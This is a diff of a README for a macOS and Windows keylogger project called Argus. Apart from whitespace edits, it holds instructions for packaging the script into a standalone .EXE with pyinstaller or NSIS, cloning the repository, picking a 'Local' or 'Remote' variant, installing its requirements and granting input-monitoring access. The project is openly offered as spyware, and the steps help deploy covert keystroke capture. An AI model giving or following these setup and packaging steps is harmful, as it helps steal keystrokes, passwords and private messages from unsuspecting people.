@@ -41,33 +41,46 @@ Keylogger With multiple Features Built For  **macOS and Windows**
 
 
 
-## if you want to convert the script to .EXE format There's two ways you can go for it
+
+# want to convert the script to .EXE format? There's two ways you can go for it
+
 
 
 **First option using pyinstaller** 
 
+
+
 **pip3 install pyinstaller**
+
 
 
 **pyinstaller --onefile filename**  **[this is gonna take a while be patient]**
 
 
+
 **when it's done it will crate a bunch of folders skip them and browse the folder [dist] an you should see .EXE file format based on the script**
+
+
 
 
 # Second option using NSIS App
 
 
+
 **Simply Download The NSIS App From the Official Website and install it**
+
 
 
 **run the NSIS App As Administrator**
 
 
+
 **click install based on ZIP file**
 
 
+
 **compress the script you want to convert and open or drag it into the NSIS App**
+
 
 
 **click generate and this will create .EXE file format based on the script**
@@ -80,10 +93,13 @@ Keylogger With multiple Features Built For  **macOS and Windows**
 **git clone https://github.com/ALDON94/argus.git**
 
 
+
 **cd Argus/macos/bin/Local**  or  **cd Argus/macos/bin/Remote**
 
 
+
 **pip3 install -r requirements.txt**
+
 
 
 **enable input monitoring for whatever app you are runing the script from**
